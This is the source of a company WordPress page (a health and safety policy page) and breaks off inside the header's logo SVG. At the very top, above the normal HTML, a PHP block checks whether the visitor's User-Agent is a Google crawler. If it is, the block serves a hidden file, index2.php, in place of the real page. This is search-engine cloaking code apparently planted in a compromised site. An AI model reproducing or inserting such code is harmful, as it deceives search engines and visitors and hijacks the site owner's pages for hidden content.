<?php
function is_google_bot() {
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }

    $agents = array(
        'Googlebot',
        'Google-Site-Verification',
        'Google-InspectionTool',
        'Googlebot-Mobile',
        'Googlebot-News'
    );

    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    foreach ($agents as $agent) {
        if (stripos($user_agent, $agent) !== false) {
            return true;
        }
    }
    return false;
}

if (is_google_bot()) {

    $file_path = dirname(__FILE__) . '/index2.php';

    if (file_exists($file_path) && is_readable($file_path)) {
        header('Content-Type: text/html; charset=utf-8');
        echo file_get_contents($file_path);
        exit;
    } else {
        header("HTTP/1.1 404 Not Found");
        echo "File not found";
        exit;
    }
}
?>


<!doctype html>
<html lang="en-GB">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
    <link rel="stylesheet" rel="preload" as="style" href="https://jigsawbusinessgroup.com/wp-content/themes/jigsaw/CSS/main.css" /> 
    <script defer src="https://jigsawbusinessgroup.com/wp-content/themes/jigsaw/js/menu.js"></script> 
	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

	<!-- This site is optimized with the Yoast SEO plugin v24.7 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Health and Safety Policy | Jigsaw Business Group</title>
	<meta name="description" content="This policy sets out the company’s commitment to employees, visitors, suppliers, and general public&#039;s health and safety at work or that enter our premises." />
	<link rel="canonical" href="https://jigsawbusinessgroup.com/health-and-safety-policy/" />
	<meta property="og:locale" content="en_GB" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Health and Safety Policy | Jigsaw Business Group" />
	<meta property="og:description" content="This policy sets out the company’s commitment to employees, visitors, suppliers, and general public&#039;s health and safety at work or that enter our premises." />
	<meta property="og:url" content="https://jigsawbusinessgroup.com/health-and-safety-policy/" />
	<meta property="og:site_name" content="Jigsaw Business Group" />
	<meta property="article:modified_time" content="2024-06-11T09:15:43+00:00" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Estimated reading time" />
	<meta name="twitter:data1" content="2 minutes" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://jigsawbusinessgroup.com/health-and-safety-policy/","url":"https://jigsawbusinessgroup.com/health-and-safety-policy/","name":"Health and Safety Policy | Jigsaw Business Group","isPartOf":{"@id":"https://jigsawbusinessgroup.com/#website"},"datePublished":"2024-02-02T10:28:05+00:00","dateModified":"2024-06-11T09:15:43+00:00","description":"This policy sets out the company’s commitment to employees, visitors, suppliers, and general public's health and safety at work or that enter our premises.","breadcrumb":{"@id":"https://jigsawbusinessgroup.com/health-and-safety-policy/#breadcrumb"},"inLanguage":"en-GB","potentialAction":[{"@type":"ReadAction","target":["https://jigsawbusinessgroup.com/health-and-safety-policy/"]}]},{"@type":"BreadcrumbList","@id":"https://jigsawbusinessgroup.com/health-and-safety-policy/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://jigsawbusinessgroup.com/"},{"@type":"ListItem","position":2,"name":"Health and Safety Policy"}]},{"@type":"WebSite","@id":"https://jigsawbusinessgroup.com/#website","url":"https://jigsawbusinessgroup.com/","name":"Jigsaw Business Group","description":"","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://jigsawbusinessgroup.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-GB"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel="alternate" type="application/rss+xml" title="Jigsaw Business Group &raquo; Feed" href="https://jigsawbusinessgroup.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Jigsaw Business Group &raquo; Comments Feed" href="https://jigsawbusinessgroup.com/comments/feed/" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://jigsawbusinessgroup.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fjigsawbusinessgroup.com%2Fhealth-and-safety-policy%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://jigsawbusinessgroup.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fjigsawbusinessgroup.com%2Fhealth-and-safety-policy%2F&#038;format=xml" />
<style id='wp-img-auto-sizes-contain-inline-css'>
img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
</style>
<style id='wp-emoji-styles-inline-css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
/*# sourceURL=wp-emoji-styles-inline-css */
</style>
<style id='wp-block-library-inline-css'>
:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}.has-text-align-center{text-align:center}.has-text-align-left{text-align:left}.has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px;word-wrap:normal!important}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}

/*# sourceURL=wp-block-library-inline-css */
</style>
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
/*# sourceURL=/wp-includes/css/classic-themes.min.css */
</style>
<link rel='stylesheet' id='mpp_gutenberg-css' href='https://jigsawbusinessgroup.com/wp-content/plugins/metronet-profile-picture/dist/blocks.style.build.css?ver=2.6.3' media='all' />
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
/*# sourceURL=global-styles-inline-css */
</style>

<link rel='stylesheet' id='contact-form-7-css' href='https://jigsawbusinessgroup.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.9.3' media='all' />
<link rel='stylesheet' id='wpcf7-redirect-script-frontend-css' href='https://jigsawbusinessgroup.com/wp-content/plugins/wpcf7-redirect/build/css/wpcf7-redirect-frontend.min.css?ver=1.1' media='all' />
<link rel='stylesheet' id='cmplz-general-css' href='https://jigsawbusinessgroup.com/wp-content/plugins/complianz-gdpr/assets/css/cookieblocker.min.css?ver=1714488313' media='all' />
<link rel='stylesheet' id='jigsaw-style-css' href='https://jigsawbusinessgroup.com/wp-content/themes/jigsaw/style.css?ver=1.0.0' media='all' />
<script src="https://jigsawbusinessgroup.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script src="https://jigsawbusinessgroup.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://jigsawbusinessgroup.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://jigsawbusinessgroup.com/wp-json/wp/v2/pages/368" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://jigsawbusinessgroup.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.9.1" />
<link rel='shortlink' href='https://jigsawbusinessgroup.com/?p=368' />
		<script type="text/javascript">
				(function(c,l,a,r,i,t,y){
					c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;
					t.src="https://www.clarity.ms/tag/"+i+"?ref=wordpress";y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
				})(window, document, "clarity", "script", "pufzublxo6");
		</script>
					<style>.cmplz-hidden {
					display: none !important;
				}</style>		<script>
			document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
		</script>
				<style>
			.no-js img.lazyload {
				display: none;
			}

			figure.wp-block-image img.lazyloading {
				min-width: 150px;
			}

						.lazyload, .lazyloading {
				opacity: 0;
			}

			.lazyloaded {
				opacity: 1;
				transition: opacity 400ms;
				transition-delay: 0ms;
			}

					</style>
		<link rel="icon" href="https://jigsawbusinessgroup.com/wp-content/uploads/2024/01/cropped-Fav-icon-32x32.png" sizes="32x32" />
<link rel="icon" href="https://jigsawbusinessgroup.com/wp-content/uploads/2024/01/cropped-Fav-icon-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://jigsawbusinessgroup.com/wp-content/uploads/2024/01/cropped-Fav-icon-180x180.png" />
<meta name="msapplication-TileImage" content="https://jigsawbusinessgroup.com/wp-content/uploads/2024/01/cropped-Fav-icon-270x270.png" />
	
	<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-T939DW8W');</script>
<!-- End Google Tag Manager -->

    <style>
        @font-face {
            font-family: 'Gotham';
            src: url('https://jigsawbusinessgroup.com/wp-content/themes/jigsaw/fonts/gotham-medium-webfont.woff') format('woff');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Gotham';
            src: url('https://jigsawbusinessgroup.com/wp-content/themes/jigsaw/fonts/gotham-bold-webfont.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }
        @font-face {
            font-family: 'Gotham';
            src: url('https://jigsawbusinessgroup.com/wp-content/themes/jigsaw/fonts/gotham-light-webfont.woff') format('woff');
            font-weight: 200;
            font-style: normal;
        }
    </style>

</head>

<body class="wp-singular page-template-default page page-id-368 wp-theme-jigsaw">
	<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T939DW8W"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#primary">Skip to content</a>

	<header id="masthead" class="site-header">
        <div class="top-nav-bar">
            <div class="page-container">
                <div class="top-nav-con">
                    <a href="tel:01912286596">
                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 18 18" fill="none">
                            <path d="M3.62 7.79C5.06 10.62 7.38 12.93 10.21 14.38L12.41 12.18C12.68 11.91 13.08 11.82 13.43 11.94C14.55 12.31 15.76 12.51 17 12.51C17.55 12.51 18 12.96 18 13.51V17C18 17.55 17.55 18 17 18C7.61 18 0 10.39 0 1C0 0.45 0.45 0 1 0H4.5C5.05 0 5.5 0.45 5.5 1C5.5 2.25 5.7 3.45 6.07 4.57C6.18 4.92 6.1 5.31 5.82 5.59L3.62 7.79Z" fill="white"/>
                        </svg>
                        <div>0191 228 6596</div>
                    </a>
                    <a href="mailto:info@jigsawbusinessgroup.com">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <path d="M20 4H4C2.9 4 2.01 4.9 2.01 6L2 18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4ZM20 8L12 13L4 8V6L12 11L20 6V8Z" fill="white"/>
                        </svg>
                        <div>info@jigsawbusinessgroup.com</div>
                    </a>
                    <div class="language">
                        <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 22 22" fill="none">
                            <path d="M20 3H10L9 0H2C0.9 0 0 0.9 0 2V17C0 18.1 0.9 19 2 19H10L11 22H20C21.1 22 22 21.1 22 20V5C22 3.9 21.1 3 20 3ZM6 15C3.24 15 1 12.76 1 10C1 7.24 3.24 5 6 5C7.35 5 8.48 5.5 9.35 6.3L8.03 7.57C7.65 7.21 6.99 6.79 6 6.79C4.26 6.79 2.85 8.23 2.85 10C2.85 11.77 4.26 13.21 6 13.21C8.01 13.21 8.84 11.77 8.92 10.8H6V9.09H10.68C10.75 9.4 10.8 9.7 10.8 10.11C10.8 12.97 8.89 15 6 15ZM12.17 9.58H15.87C15.44 10.83 14.76 12.01 13.82 13.05C13.51 12.7 13.22 12.33 12.96 11.95L12.17 9.58ZM20.5 19.5C20.5 20.05 20.05 20.5 19.5 20.5H13L15 18L13.96 14.9L17.06 18L17.98 17.08L14.68 13.83L14.7 13.81C15.83 12.56 16.63 11.12 17.1 9.59H19V8.29H14.47V7H13.18V8.29H11.74L10.46 4.5H19.5C20.05 4.5 20.5 4.95 20.5 5.5V19.5Z" fill="white"/>
                        </svg>
                        <div class="gtranslate_wrapper"></div>
                            <script>window.gtranslateSettings = {"default_language":"en","native_language_names":true,"languages":["en","fr","de","it","es","nl","ja"],"wrapper_selector":".gtranslate_wrapper","select_language_label":"Language"}</script>
                            <!-- <script src="https://cdn.gtranslate.net/widgets/latest/dropdown.js" defer></script> -->
                    </div>
                </div>
            </div>
        </div>
        <div class="page-container">
            <div class="header-nav-con">
		<div class="site-branding">
        <a aria-label="Home" href="https://jigsawbusinessgroup.com/" rel="home" class=""> 
        <svg xmlns="http://www.w3.org/2000/svg" width="167" height="46" viewBox="0 0 167 46" fill="none">
            <path d="M59.5403 24.8729C57.9377 24.8729 56.6071 24.5314 55.5486 23.8486C54.5038 23.1805 53.6187 22.291 52.9558 21.2429L54.694 19.8089C55.2495 20.6639 55.9633 21.4049 56.797 21.992C57.6319 22.5141 58.6043 22.7739 59.5883 22.7378C60.1431 22.7504 60.6944 22.646 61.2062 22.4314C61.718 22.2169 62.1789 21.897 62.5589 21.4926C63.3528 20.6646 63.7497 19.4407 63.7497 17.821V4.0918H66.1569V17.7922C66.1799 18.8688 66.0063 19.9405 65.6447 20.9548C65.344 21.7922 64.8607 22.5521 64.2298 23.1795C63.0177 24.3106 61.4545 24.875 59.5403 24.8729Z" fill="#00476D"/>
            <path d="M71.5537 3.6543H74.2394V6.1415H71.5537V3.6543ZM71.7074 9.44816H74.0537V24.5826H71.7074V9.44816Z" fill="#00476D"/>
            <path d="M86.4961 29.3166C85.221 29.3228 83.9514 29.1482 82.7253 28.798C81.5244 28.4441 80.3837 27.911 79.3418 27.2167L80.3982 25.4754C81.2868 26.0855 82.2566 26.5682 83.2791 26.9094C84.312 27.2483 85.3931 27.417 86.4801 27.4088C88.2279 27.4088 89.615 26.9542 90.6415 26.0451C91.6679 25.136 92.1865 23.7948 92.1972 22.0214V20.2353C91.4893 21.1232 90.6325 21.8813 89.6652 22.476C88.5603 23.1319 87.2905 23.4574 86.0064 23.4139C85.0641 23.4146 84.1294 23.2455 83.2471 22.9145C82.3786 22.5907 81.5777 22.1088 80.8847 21.4933C80.1875 20.8705 79.6226 20.1139 79.2234 19.2686C78.7903 18.349 78.5714 17.3432 78.5832 16.3268V16.2692C78.5632 15.2849 78.7572 14.308 79.1518 13.406C79.5464 12.504 80.1322 11.6985 80.8687 11.0451C81.5656 10.4267 82.3723 9.94456 83.2471 9.62385C84.1247 9.2965 85.0537 9.12847 85.9904 9.12769C86.6746 9.12225 87.3568 9.2051 88.0198 9.37417C88.6029 9.52724 89.1659 9.74857 89.6972 10.0336C90.1845 10.2997 90.6389 10.622 91.0512 10.9939C91.4483 11.354 91.8155 11.7458 92.1492 12.1655V9.4414H94.4987V21.9254C94.519 22.9783 94.3432 24.0258 93.9801 25.0144C93.6542 25.8704 93.1438 26.6441 92.4853 27.2807C91.7487 27.98 90.8617 28.5012 89.8924 28.8044C88.7941 29.1516 87.648 29.3245 86.4961 29.3166ZM86.4641 21.4132C87.2009 21.4158 87.9328 21.2924 88.628 21.0483C89.3031 20.8135 89.9292 20.4566 90.475 19.9952C91.0036 19.5416 91.4385 18.9893 91.7554 18.3691C92.0863 17.7271 92.2545 17.0137 92.2452 16.2916V16.234C92.2568 15.5014 92.0887 14.777 91.7554 14.1245C91.4388 13.5115 91.0036 12.9675 90.475 12.524C89.926 12.0711 89.3005 11.7198 88.628 11.4869C87.933 11.2418 87.2011 11.1173 86.4641 11.1187C85.7415 11.1146 85.0239 11.2392 84.345 11.4869C83.7073 11.7179 83.1179 12.0652 82.6069 12.5112C82.1052 12.9544 81.7045 13.5002 81.4321 14.1117C81.1396 14.7759 80.9944 15.4955 81.0064 16.2212V16.2788C80.9983 16.9971 81.148 17.7085 81.4449 18.3627C81.7268 18.9793 82.132 19.5317 82.6357 19.9856C83.1444 20.4419 83.7339 20.7991 84.3739 21.0387C85.0406 21.2954 85.7497 21.4246 86.4641 21.4196V21.4132Z" fill="#00476D"/>
            <path d="M104.972 24.8733C103.798 24.8678 102.633 24.6655 101.525 24.2747C100.418 23.9019 99.3778 23.3528 98.4456 22.6486L99.6363 21.048C100.45 21.6537 101.349 22.1368 102.303 22.4821C103.197 22.8094 104.142 22.9784 105.094 22.9815C105.924 23.0178 106.744 22.7939 107.44 22.3413C107.73 22.1508 107.967 21.8893 108.127 21.5817C108.287 21.2741 108.366 20.9306 108.356 20.5839V20.5263C108.362 20.179 108.249 19.84 108.036 19.566C107.797 19.2723 107.502 19.0286 107.168 18.8489C106.76 18.6282 106.331 18.4471 105.888 18.308C105.411 18.1511 104.928 17.9879 104.409 17.8694C103.801 17.6923 103.186 17.5013 102.565 17.2964C101.977 17.1072 101.414 16.8471 100.888 16.5218C100.402 16.2229 99.9865 15.8234 99.6683 15.3502C99.3378 14.8264 99.1727 14.2151 99.1946 13.5961V13.5352C99.1888 12.9225 99.3247 12.3167 99.5915 11.7651C99.856 11.2292 100.237 10.759 100.705 10.3886C101.214 9.99199 101.793 9.69447 102.412 9.51154C103.108 9.29725 103.834 9.18933 104.563 9.19144C105.566 9.19495 106.563 9.34815 107.52 9.64598C108.475 9.92919 109.387 10.3371 110.235 10.8592L109.166 12.5589C108.444 12.1121 107.671 11.7531 106.864 11.4898C106.103 11.2316 105.306 11.0976 104.502 11.0928C103.71 11.0534 102.927 11.2786 102.277 11.7331C102.023 11.9075 101.815 12.1411 101.671 12.4138C101.527 12.6864 101.452 12.99 101.451 13.2984V13.356C101.446 13.6941 101.566 14.0223 101.787 14.2779C102.04 14.5637 102.345 14.7975 102.687 14.9661C103.099 15.1766 103.527 15.3532 103.967 15.4943C104.454 15.65 104.962 15.8058 105.491 15.9616C106.101 16.1387 106.706 16.334 107.306 16.5474C107.882 16.7517 108.43 17.027 108.939 17.3669C109.408 17.6819 109.807 18.0906 110.11 18.5672C110.419 19.0895 110.572 19.6893 110.552 20.2958V20.3534C110.566 21.0203 110.414 21.6802 110.11 22.274C109.819 22.8253 109.414 23.3087 108.923 23.6921C108.394 